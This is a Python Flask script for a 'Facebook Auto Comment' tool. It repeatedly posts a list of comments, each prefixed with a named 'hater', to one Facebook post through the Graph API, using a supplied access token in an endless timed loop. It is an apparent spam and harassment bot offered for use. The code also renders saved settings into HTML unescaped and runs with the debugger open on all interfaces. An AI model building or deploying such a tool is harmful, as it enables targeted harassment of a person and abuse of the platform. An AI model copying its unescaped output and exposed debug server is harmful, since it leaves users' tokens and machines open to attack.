from flask import Flask, request
import requests
import time
import threading
import json
import os

app = Flask(__name__)

# Default settings
settings = {"token": "", "post_id": "", "comments": [], "haters_name": "", "time": 10}

# Load settings from a file
if os.path.exists("settings.json"):
    with open("settings.json", "r") as file:
        settings.update(json.load(file))

# Save settings to a file
def save_settings():
    with open("settings.json", "w") as file:
        json.dump(settings, file)

# Auto-comment function
def auto_comment():
    headers = {"User-Agent": "Mozilla/5.0"}

    while True:
        for comment in settings["comments"]:
            url = f"https://graph.facebook.com/v15.0/{settings['post_id']}/comments"
            parameters = {"access_token": settings["token"], "message": f"{settings['haters_name']} {comment}"}

            try:
                response = requests.post(url, json=parameters, headers=headers)
                if response.ok:
                    print(f"[+] Comment Posted: {settings['haters_name']} {comment}")
                else:
                    print(f"[x] Failed to post comment: {settings['haters_name']} {comment}")
            except requests.exceptions.RequestException as e:
                print(f"[!] Error: {e}")

            time.sleep(settings["time"])

@app.route("/", methods=["GET", "POST"])
def index():
    global settings

    if request.method == "POST":
        settings["token"] = request.form["token"]
        settings["post_id"] = request.form["post_id"]
        settings["haters_name"] = request.form["haters_name"]
        settings["time"] = int(request.form["time"])
        settings["comments"] = request.form["comments"].split("\n")

        save_settings()

    return f'''
    <html>
    <head><title>Facebook Auto Comment</title></head>
    <body>
        <h2>Facebook Auto Comment Settings</h2>
        <form method="POST">
            <label>Facebook Token:</label><br>
            <input type="text" name="token" value="{settings["token"]}" required><br><br>

            <label>Post ID:</label><br>
            <input type="text" name="post_id" value="{settings["post_id"]}" required><br><br>

            <label>Haters Name:</label><br>
            <input type="text" name="haters_name" value="{settings["haters_name"]}" required><br><br>

            <label>Time Interval (Seconds):</label><br>
            <input type="number" name="time" value="{settings["time"]}" required><br><br>

            <label>Comments (One per line):</label><br>
            <textarea name="comments" rows="5" cols="40" required>{'\n'.join(settings["comments"])}</textarea><br><br>

            <input type="submit" value="Save & Start">
        </form>
    </body>
    </html>
    '''

# Start auto-commenting in a separate thread
comment_thread = threading.Thread(target=auto_comment, daemon=True)
comment_thread.start()

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000, debug=True)
